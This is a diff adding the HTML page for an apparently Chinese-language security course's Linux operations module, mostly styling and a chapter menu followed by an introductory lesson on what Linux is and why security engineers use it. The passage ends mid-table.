@@ -1,0 +1,2652 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stage 02 — Linux 運維基礎 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e14;
+    --bg2: #0f1520;
+    --bg3: #151d2e;
+    --surface: #1a2438;
+    --border: #243050;
+    --accent: #00b8e6;
+    --accent-dim: rgba(0,184,230,0.1);
+    --text: #e8edf5;
+    --text2: #8a9bbf;
+    --text3: #5a6b8a;
+    --green: #00d4aa;
+    --blue: #0096ff;
+    --orange: #ff6b35;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Noto Sans TC', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,184,230,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,184,230,0.02) 1px, transparent 1px);
+    background-size: 60px 60px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 40px;
+    height: 64px;
+    background: rgba(10,14,20,0.95);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+  }
+  .nav-logo { font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent); text-decoration: none; }
+  .nav-logo span { color: var(--text3); }
+  .nav-center {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .nav-stage-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--bg);
+    background: var(--accent);
+    padding: 3px 10px;
+    border-radius: 2px;
+    letter-spacing: 0.08em;
+    font-weight: 700;
+  }
+  .nav-stage-title {
+    font-size: 0.82rem;
+    color: var(--text2);
+  }
+  .nav-back {
+    color: var(--text3);
+    text-decoration: none;
+    font-size: 0.82rem;
+    transition: color 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .nav-back:hover { color: var(--accent); }
+
+  .layout {
+    display: grid;
+    grid-template-columns: 290px 1fr;
+    min-height: 100vh;
+    padding-top: 64px;
+  }
+
+  /* SIDEBAR */
+  .sidebar {
+    position: sticky;
+    top: 64px;
+    height: calc(100vh - 64px);
+    overflow-y: auto;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 0;
+    z-index: 10;
+  }
+  .sidebar::-webkit-scrollbar { width: 3px; }
+  .sidebar::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .sidebar-top {
+    padding: 28px 24px 20px;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(0,184,230,0.05) 0%, transparent 100%);
+  }
+  .sidebar-stage-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.62rem;
+    color: var(--accent);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .sidebar-main-title {
+    font-size: 0.95rem;
+    font-weight: 700;
+    line-height: 1.4;
+    margin-bottom: 12px;
+  }
+  .sidebar-stats {
+    display: flex;
+    gap: 20px;
+  }
+  .ss-item {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+  .ss-val {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    font-weight: 700;
+    color: var(--accent);
+  }
+  .ss-key {
+    font-size: 0.65rem;
+    color: var(--text3);
+    letter-spacing: 0.05em;
+  }
+
+  .chapter-group { }
+  .chapter-btn {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding: 11px 24px;
+    background: none;
+    border: none;
+    border-bottom: 1px solid rgba(36,48,80,0.5);
+    color: var(--text2);
+    font-family: 'Noto Sans TC', sans-serif;
+    font-size: 0.82rem;
+    font-weight: 500;
+    cursor: pointer;
+    text-align: left;
+    transition: all 0.2s;
+    gap: 10px;
+  }
+  .chapter-btn:hover { color: var(--text); background: var(--bg3); }
+  .chapter-btn.active-ch { color: var(--accent); }
+  .chapter-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.62rem;
+    color: var(--text3);
+    min-width: 28px;
+    flex-shrink: 0;
+  }
+  .chapter-btn.active-ch .chapter-num { color: var(--accent); }
+  .chapter-name { flex: 1; }
+  .chapter-chevron { font-size: 0.55rem; color: var(--text3); transition: transform 0.2s; flex-shrink: 0; }
+  .chapter-btn.ch-open .chapter-chevron { transform: rotate(90deg); }
+
+  .lesson-list { display: none; background: rgba(0,0,0,0.15); }
+  .lesson-list.open { display: flex; flex-direction: column; }
+
+  .lesson-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 24px 9px 48px;
+    background: none;
+    border: none;
+    border-bottom: 1px solid rgba(36,48,80,0.3);
+    color: var(--text3);
+    font-family: 'Noto Sans TC', sans-serif;
+    font-size: 0.78rem;
+    cursor: pointer;
+    text-align: left;
+    width: 100%;
+    transition: all 0.2s;
+    line-height: 1.4;
+  }
+  .lesson-btn:hover { color: var(--text2); background: rgba(0,184,230,0.03); }
+  .lesson-btn.active { color: var(--accent); background: rgba(0,184,230,0.06); }
+  .lesson-btn.done { color: var(--text3); }
+  .lesson-dot {
+    width: 5px; height: 5px;
+    border-radius: 50%;
+    background: var(--border);
+    flex-shrink: 0;
+    transition: background 0.2s;
+  }
+  .lesson-btn.active .lesson-dot { background: var(--accent); }
+  .lesson-btn.done .lesson-dot { background: var(--green); }
+
+  .sidebar-bottom {
+    padding: 16px 24px;
+    border-top: 1px solid var(--border);
+  }
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.7rem;
+    color: var(--text3);
+    margin-bottom: 8px;
+  }
+  .progress-bar {
+    height: 3px;
+    background: var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    border-radius: 2px;
+    transition: width 0.5s;
+  }
+
+  /* MAIN */
+  .main { position: relative; z-index: 1; }
+
+  .lesson-header {
+    padding: 44px 60px 36px;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(0,184,230,0.04) 0%, transparent 100%);
+  }
+  .lesson-crumb {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    color: var(--text3);
+    letter-spacing: 0.06em;
+    margin-bottom: 14px;
+  }
+  .lesson-crumb span { color: var(--accent); }
+  .lesson-title {
+    font-size: 1.75rem;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    line-height: 1.2;
+    margin-bottom: 14px;
+  }
+  .lesson-tags {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .lesson-tag {
+    padding: 3px 12px;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    font-size: 0.7rem;
+    color: var(--text3);
+    font-family: 'JetBrains Mono', monospace;
+    letter-spacing: 0.04em;
+  }
+  .lesson-tag.accent { border-color: var(--accent); color: var(--accent); }
+
+  .content-wrap {
+    padding: 44px 60px 80px;
+    max-width: 880px;
+  }
+
+  .content-block { display: none; }
+  .content-block.active {
+    display: block;
+    animation: fadeSlide 0.3s ease;
+  }
+  @keyframes fadeSlide {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  h2 {
+    font-size: 1.35rem;
+    font-weight: 800;
+    margin: 40px 0 16px;
+    letter-spacing: -0.01em;
+    color: var(--text);
+    border-left: 3px solid var(--accent);
+    padding-left: 14px;
+  }
+  h2:first-child { margin-top: 0; }
+  h3 {
+    font-size: 1.05rem;
+    font-weight: 700;
+    margin: 28px 0 12px;
+    color: var(--text);
+  }
+  h4 {
+    font-size: 0.92rem;
+    font-weight: 700;
+    margin: 20px 0 8px;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+    letter-spacing: 0.03em;
+  }
+  p {
+    font-size: 0.93rem;
+    line-height: 1.82;
+    color: var(--text2);
+    margin-bottom: 14px;
+    font-weight: 300;
+  }
+  strong { color: var(--text); font-weight: 600; }
+
+  /* callouts */
+  .callout {
+    border-radius: 0 4px 4px 0;
+    padding: 16px 20px;
+    margin: 22px 0;
+  }
+  .callout-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.62rem;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+  .callout p { margin: 0; font-size: 0.88rem; line-height: 1.7; }
+  .callout.tip { background: rgba(0,184,230,0.08); border-left: 3px solid var(--accent); }
+  .callout.tip .callout-label { color: var(--accent); }
+  .callout.warn { background: rgba(255,107,53,0.08); border-left: 3px solid var(--orange); }
+  .callout.warn .callout-label { color: var(--orange); }
+  .callout.info { background: rgba(0,212,170,0.07); border-left: 3px solid var(--green); }
+  .callout.info .callout-label { color: var(--green); }
+  .callout.danger { background: rgba(255,71,87,0.08); border-left: 3px solid var(--red); }
+  .callout.danger .callout-label { color: var(--red); }
+
+  /* terminal */
+  .terminal {
+    background: #090d13;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 20px 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .terminal-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 9px 16px;
+    background: #0d1220;
+    border-bottom: 1px solid var(--border);
+  }
+  .terminal-dots { display: flex; gap: 6px; }
+  .terminal-dots span {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+  }
+  .td1 { background: #ff5f56; }
+  .td2 { background: #ffbd2e; }
+  .td3 { background: #27c93f; }
+  .terminal-title {
+    font-size: 0.65rem;
+    color: var(--text3);
+    letter-spacing: 0.06em;
+  }
+  .terminal-copy {
+    font-size: 0.65rem;
+    color: var(--text3);
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-family: 'JetBrains Mono', monospace;
+    transition: color 0.2s;
+  }
+  .terminal-copy:hover { color: var(--accent); }
+  .terminal-body {
+    padding: 20px 20px;
+    overflow-x: auto;
+    font-size: 0.82rem;
+    line-height: 1.75;
+    color: #c9d1d9;
+  }
+  .terminal-body .prompt { color: var(--green); }
+  .terminal-body .cmd { color: #79c0ff; }
+  .terminal-body .flag { color: #ffa657; }
+  .terminal-body .path { color: #a5d6ff; }
+  .terminal-body .out { color: var(--text3); }
+  .terminal-body .comment { color: #6e7681; font-style: italic; }
+  .terminal-body .highlight-out { color: var(--accent); }
+  .terminal-body .err { color: var(--red); }
+  .terminal-body .ok { color: var(--green); }
+
+  /* cmd ref table */
+  .cmd-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 2px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    margin: 20px 0;
+  }
+  .cmd-card {
+    background: var(--bg2);
+    padding: 16px 18px;
+    transition: background 0.2s;
+  }
+  .cmd-card:hover { background: var(--bg3); }
+  .cmd-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82rem;
+    color: var(--accent);
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+  .cmd-syntax {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--text3);
+    margin-bottom: 6px;
+  }
+  .cmd-desc {
+    font-size: 0.78rem;
+    color: var(--text2);
+    line-height: 1.5;
+    font-weight: 300;
+  }
+
+  /* permission grid */
+  .perm-visual {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 24px;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    overflow-x: auto;
+  }
+  .perm-row { display: flex; gap: 0; margin-bottom: 8px; align-items: center; }
+  .perm-cell {
+    width: 36px; height: 36px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.9rem; font-weight: 700;
+    border: 1px solid var(--border);
+    margin-right: -1px;
+  }
+  .perm-cell.r { color: var(--green); background: rgba(0,212,170,0.08); }
+  .perm-cell.w { color: var(--yellow); background: rgba(255,211,42,0.08); }
+  .perm-cell.x { color: var(--orange); background: rgba(255,107,53,0.08); }
+  .perm-cell.dash { color: var(--text3); }
+  .perm-cell.type { color: var(--accent); background: rgba(0,184,230,0.08); }
+  .perm-label {
+    font-size: 0.65rem;
+    color: var(--text3);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-left: 16px;
+  }
+  .perm-sep { width: 8px; }
+
+  /* data table */
+  .table-wrap { overflow-x: auto; margin: 20px 0; }
+  table.dt {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.84rem;
+  }
+  table.dt th {
+    background: var(--surface);
+    padding: 11px 16px;
+    text-align: left;
+    font-size: 0.68rem;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--text3);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    border: 1px solid var(--border);
+  }
+  table.dt td {
+    padding: 11px 16px;
+    border: 1px solid var(--border);
+    color: var(--text2);
+    font-weight: 300;
+    vertical-align: top;
+    line-height: 1.55;
+  }
+  table.dt tr:hover td { background: var(--bg3); }
+  table.dt .mono { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--accent); }
+
+  /* key terms */
+  .terms-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 2px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    margin: 20px 0;
+  }
+  .term-card {
+    background: var(--bg2);
+    padding: 16px 18px;
+  }
+  .term-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--accent);
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+  .term-def {
+    font-size: 0.8rem;
+    color: var(--text2);
+    line-height: 1.6;
+    font-weight: 300;
+  }
+
+  /* quiz */
+  .quiz {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 26px;
+    margin: 30px 0;
+  }
+  .quiz-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.62rem;
+    color: var(--yellow);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+  .quiz-q { font-size: 0.93rem; font-weight: 600; margin-bottom: 16px; line-height: 1.5; }
+  .quiz-opts { display: flex; flex-direction: column; gap: 8px; }
+  .quiz-opt {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    color: var(--text2);
+    transition: all 0.2s;
+    line-height: 1.5;
+  }
+  .quiz-opt:hover { border-color: var(--accent); color: var(--text); }
+  .quiz-opt.correct { border-color: var(--green); background: rgba(0,212,170,0.08); color: var(--green); }
+  .quiz-opt.wrong { border-color: var(--red); background: rgba(255,71,87,0.08); color: var(--red); }
+  .quiz-opt-key {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--text3);
+    min-width: 18px;
+    padding-top: 1px;
+  }
+  .quiz-exp {
+    display: none;
+    margin-top: 14px;
+    padding: 12px 16px;
+    background: rgba(0,184,230,0.06);
+    border-radius: 4px;
+    font-size: 0.84rem;
+    color: var(--text2);
+    line-height: 1.65;
+    border-left: 2px solid var(--accent);
+  }
+  .quiz-exp.show { display: block; }
+
+  /* lesson footer nav */
+  .lesson-nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 28px 60px;
+    border-top: 1px solid var(--border);
+    background: var(--bg2);
+    position: sticky;
+    bottom: 0;
+    z-index: 5;
+  }
+  .nav-btn {
+    display: flex; align-items: center; gap: 8px;
+    padding: 10px 22px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: none;
+    color: var(--text2);
+    font-size: 0.85rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: 'Noto Sans TC', sans-serif;
+  }
+  .nav-btn:hover:not(:disabled) { border-color: var(--accent); color: var(--accent); }
+  .nav-btn.primary { background: var(--accent); color: var(--bg); border-color: var(--accent); font-weight: 700; }
+  .nav-btn.primary:hover:not(:disabled) { background: #2ccff5; }
+  .nav-btn:disabled { opacity: 0.25; cursor: not-allowed; }
+  .nav-info {
+    text-align: center;
+  }
+  .nav-counter { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--text3); }
+  .nav-lesson-title { font-size: 0.78rem; color: var(--text3); margin-top: 3px; max-width: 280px; }
+
+  /* inline code */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 3px;
+    color: var(--accent);
+  }
+
+  /* dir structure */
+  .dir-tree {
+    background: #090d13;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 20px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.9;
+    color: var(--text2);
+    margin: 20px 0;
+    overflow-x: auto;
+  }
+  .dir-tree .dir { color: var(--accent); }
+  .dir-tree .file { color: var(--text2); }
+  .dir-tree .desc { color: var(--text3); font-style: italic; }
+  .dir-tree .important { color: var(--yellow); }
+  .dir-tree .danger { color: var(--red); }
+
+  /* stage complete banner */
+  .complete-banner {
+    background: linear-gradient(135deg, rgba(0,184,230,0.1), rgba(0,212,170,0.05));
+    border: 1px solid rgba(0,184,230,0.3);
+    border-radius: 6px;
+    padding: 32px;
+    margin: 40px 0 20px;
+    text-align: center;
+  }
+  .complete-banner h3 {
+    font-size: 1.2rem;
+    font-weight: 800;
+    margin-bottom: 10px;
+    color: var(--accent);
+  }
+  .complete-banner p { font-size: 0.9rem; margin-bottom: 24px; }
+  .btn-row { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
+  .btn-primary {
+    display: inline-block;
+    padding: 12px 28px;
+    background: var(--accent);
+    color: var(--bg);
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 0.88rem;
+    border-radius: 4px;
+    transition: all 0.2s;
+  }
+  .btn-primary:hover { background: #2ccff5; transform: translateY(-1px); }
+  .btn-ghost {
+    display: inline-block;
+    padding: 12px 28px;
+    border: 1px solid var(--border);
+    color: var(--text2);
+    text-decoration: none;
+    font-size: 0.88rem;
+    border-radius: 4px;
+    transition: all 0.2s;
+  }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+
+  @media (max-width: 900px) {
+    .layout { grid-template-columns: 1fr; }
+    .sidebar { position: static; height: auto; }
+    .lesson-header, .content-wrap { padding-left: 24px; padding-right: 24px; }
+    .lesson-nav { padding: 20px 24px; }
+    .terms-grid { grid-template-columns: 1fr; }
+    .nav-lesson-title { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="index.html" class="nav-logo">SEC<span>_</span>TRACK</a>
+  <div class="nav-center">
+    <span class="nav-stage-badge">STAGE 02</span>
+    <span class="nav-stage-title">Linux 運維基礎</span>
+  </div>
+  <a href="index.html" class="nav-back">&#8592; 返回首頁</a>
+</nav>
+
+<div class="layout">
+
+  <!-- ===== SIDEBAR ===== -->
+  <aside class="sidebar">
+    <div class="sidebar-top">
+      <div class="sidebar-stage-tag">STAGE 02 · 2週</div>
+      <div class="sidebar-main-title">Linux 運維基礎</div>
+      <div class="sidebar-stats">
+        <div class="ss-item"><span class="ss-val">10</span><span class="ss-key">章節</span></div>
+        <div class="ss-item"><span class="ss-val">28</span><span class="ss-key">課程</span></div>
+        <div class="ss-item"><span class="ss-val">6-8K</span><span class="ss-key">月薪目標</span></div>
+      </div>
+    </div>
+
+    <!-- CH1 -->
+    <div class="chapter-group">
+      <button class="chapter-btn ch-open active-ch" onclick="toggleCh(this,'ch1')">
+        <span class="chapter-num">CH1</span>
+        <span class="chapter-name">Linux 介紹、安裝及命令</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list open" id="ch1">
+        <button class="lesson-btn active" onclick="goLesson('l1-1',this)"><span class="lesson-dot"></span>Linux 是什麼？為何學 Linux？</button>
+        <button class="lesson-btn" onclick="goLesson('l1-2',this)"><span class="lesson-dot"></span>VMware 安裝與 Linux 系統安裝</button>
+        <button class="lesson-btn" onclick="goLesson('l1-3',this)"><span class="lesson-dot"></span>VMware 網路配置與 Xshell 連線</button>
+        <button class="lesson-btn" onclick="goLesson('l1-4',this)"><span class="lesson-dot"></span>pwd / cd / tree / mkdir 命令</button>
+      </div>
+    </div>
+
+    <!-- CH2 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch2')">
+        <span class="chapter-num">CH2</span>
+        <span class="chapter-name">Linux 必備命令</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch2">
+        <button class="lesson-btn" onclick="goLesson('l2-1',this)"><span class="lesson-dot"></span>touch / ls 命令詳解</button>
+        <button class="lesson-btn" onclick="goLesson('l2-2',this)"><span class="lesson-dot"></span>cp 複製命令</button>
+        <button class="lesson-btn" onclick="goLesson('l2-3',this)"><span class="lesson-dot"></span>rm 刪除 / mv 移動與重命名</button>
+      </div>
+    </div>
+
+    <!-- CH3 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch3')">
+        <span class="chapter-num">CH3</span>
+        <span class="chapter-name">VIM 編輯器</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch3">
+        <button class="lesson-btn" onclick="goLesson('l3-1',this)"><span class="lesson-dot"></span>Linux 啟動流程與 VIM 介紹</button>
+        <button class="lesson-btn" onclick="goLesson('l3-2',this)"><span class="lesson-dot"></span>VIM 三大模式與基本操作</button>
+        <button class="lesson-btn" onclick="goLesson('l3-3',this)"><span class="lesson-dot"></span>VIM 快捷鍵大全</button>
+      </div>
+    </div>
+
+    <!-- CH4 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch4')">
+        <span class="chapter-num">CH4</span>
+        <span class="chapter-name">基礎命令與目錄結構</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch4">
+        <button class="lesson-btn" onclick="goLesson('l4-1',this)"><span class="lesson-dot"></span>echo / cat / head 命令</button>
+        <button class="lesson-btn" onclick="goLesson('l4-2',this)"><span class="lesson-dot"></span>相對路徑與絕對路徑</button>
+        <button class="lesson-btn" onclick="goLesson('l4-3',this)"><span class="lesson-dot"></span>Linux 重要目錄結構詳解</button>
+        <button class="lesson-btn" onclick="goLesson('l4-4',this)"><span class="lesson-dot"></span>tail / grep 命令與重定向</button>
+      </div>
+    </div>
+
+    <!-- CH5 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch5')">
+        <span class="chapter-num">CH5</span>
+        <span class="chapter-name">常用命令彙總</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch5">
+        <button class="lesson-btn" onclick="goLesson('l5-1',this)"><span class="lesson-dot"></span>Linux 命令總結</button>
+        <button class="lesson-btn" onclick="goLesson('l5-2',this)"><span class="lesson-dot"></span>file / which / find / xargs 命令</button>
+        <button class="lesson-btn" onclick="goLesson('l5-3',this)"><span class="lesson-dot"></span>時間同步與系統命令</button>
+      </div>
+    </div>
+
+    <!-- CH6 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch6')">
+        <span class="chapter-num">CH6</span>
+        <span class="chapter-name">壓縮、定時任務、權限、用戶</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch6">
+        <button class="lesson-btn" onclick="goLesson('l6-1',this)"><span class="lesson-dot"></span>tar 壓縮解壓縮</button>
+        <button class="lesson-btn" onclick="goLesson('l6-2',this)"><span class="lesson-dot"></span>Linux 權限配置詳解</button>
+        <button class="lesson-btn" onclick="goLesson('l6-3',this)"><span class="lesson-dot"></span>crontab 定時任務</button>
+        <button class="lesson-btn" onclick="goLesson('l6-4',this)"><span class="lesson-dot"></span>Linux 用戶管理</button>
+        <button class="lesson-btn" onclick="goLesson('l6-5',this)"><span class="lesson-dot"></span>常用系統命令</button>
+      </div>
+    </div>
+
+    <!-- CH7 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch7')">
+        <span class="chapter-num">CH7</span>
+        <span class="chapter-name">Docker 部署安裝</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch7">
+        <button class="lesson-btn" onclick="goLesson('l7-1',this)"><span class="lesson-dot"></span>Docker 概念與安裝</button>
+        <button class="lesson-btn" onclick="goLesson('l7-2',this)"><span class="lesson-dot"></span>映像操作命令</button>
+        <button class="lesson-btn" onclick="goLesson('l7-3',this)"><span class="lesson-dot"></span>容器操作與重啟策略</button>
+        <button class="lesson-btn" onclick="goLesson('l7-4',this)"><span class="lesson-dot"></span>容器端口映射與文件傳遞</button>
+      </div>
+    </div>
+
+    <!-- CH8 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch8')">
+        <span class="chapter-num">CH8</span>
+        <span class="chapter-name">企業日誌收集 ELK</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch8">
+        <button class="lesson-btn" onclick="goLesson('l8-1',this)"><span class="lesson-dot"></span>ELK 介紹與架構</button>
+        <button class="lesson-btn" onclick="goLesson('l8-2',this)"><span class="lesson-dot"></span>ELK 部署與 Kibana 視覺化</button>
+      </div>
+    </div>
+
+    <!-- CH9 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch9')">
+        <span class="chapter-num">CH9</span>
+        <span class="chapter-name">開源堡壘機 JumpServer</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch9">
+        <button class="lesson-btn" onclick="goLesson('l9-1',this)"><span class="lesson-dot"></span>堡壘機概念與 JumpServer 安裝</button>
+        <button class="lesson-btn" onclick="goLesson('l9-2',this)"><span class="lesson-dot"></span>JumpServer 安全策略配置</button>
+      </div>
+    </div>
+
+    <!-- CH10 -->
+    <div class="chapter-group">
+      <button class="chapter-btn" onclick="toggleCh(this,'ch10')">
+        <span class="chapter-num">CH10</span>
+        <span class="chapter-name">企業 OpenVPN 搭建</span>
+        <span class="chapter-chevron">&#9658;</span>
+      </button>
+      <div class="lesson-list" id="ch10">
+        <button class="lesson-btn" onclick="goLesson('l10-1',this)"><span class="lesson-dot"></span>OpenVPN 原理與搭建實戰</button>
+      </div>
+    </div>
+
+    <div class="sidebar-bottom">
+      <div class="progress-header">
+        <span>學習進度</span>
+        <span id="pct-label">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="prog-fill" style="width:0%"></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ===== MAIN ===== -->
+  <main class="main">
+    <div class="lesson-header">
+      <div class="lesson-crumb" id="crumb">STAGE 02 &gt; CH1 &gt; <span>課程1</span></div>
+      <h1 class="lesson-title" id="ltitle">Linux 是什麼？為何學 Linux？</h1>
+      <div class="lesson-tags">
+        <span class="lesson-tag accent" id="ltag1">基礎概念</span>
+        <span class="lesson-tag" id="ltag2">預計 15 分鐘</span>
+      </div>
+    </div>
+
+    <div class="content-wrap">
+
+      <!-- ============================================================ -->
+      <!-- L1-1  Linux 是什麼 -->
+      <!-- ============================================================ -->
+      <div class="content-block active" id="l1-1">
+        <h2>什麼是 Linux？</h2>
+        <p>Linux 是一套開源的、類 Unix 的作業系統核心（Kernel），由 Linus Torvalds 於 1991 年開始開發。搭配 GNU 工具集後形成完整的作業系統，通常稱為 GNU/Linux。</p>
+        <p>Linux 以「發行版（Distribution）」的形式提供給用戶，常見的發行版包括 CentOS、Ubuntu、Debian、Kali Linux 等。<strong>在資安領域，CentOS/RHEL 是企業伺服器的主流環境，Kali Linux 則是滲透測試的標準平台。</strong></p>
+
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">核心 (Kernel)</div>
+            <div class="term-def">作業系統的核心程式，負責管理硬體資源（CPU、記憶體、磁碟）、進程調度、檔案系統、設備驅動等。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Shell</div>
+            <div class="term-def">用戶與核心之間的介面，接收用戶輸入的命令並傳達給核心執行。常見的 Shell：bash、sh、zsh、fish。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">發行版 (Distro)</div>
+            <div class="term-def">Linux Kernel + GNU 工具 + 套件管理器 + 默認配置 的組合。CentOS 使用 yum/dnf，Ubuntu 使用 apt。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">開源 (Open Source)</div>
+            <div class="term-def">原始碼完全公開，任何人都可以查看、修改、重新分發。這使得 Linux 的安全問題能被全球社群快速發現並修補。</div>
+          </div>
+        </div>
+
+        <h2>為什麼資安工程師必須會 Linux？</h2>
+        <p>根據統計，全球 96% 的 Web 伺服器運行 Linux，幾乎所有的雲端基礎設施（AWS EC2、GCP、Azure）默認也是 Linux。更重要的是：</p>
+
+        <div class="table-wrap">
+          <table class="dt">
+            <thead>
+              <tr><th>應用場景</th><th>Linux 的角色</th><th>具體例子</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>滲透測試</td>
+                <td>攻擊平台</td>
+                <td>Kali Linux 上運行 Metasploit、Nmap、Burp Suite</td>
+              </tr>
+              <tr>
+                <td>目標系統</td>
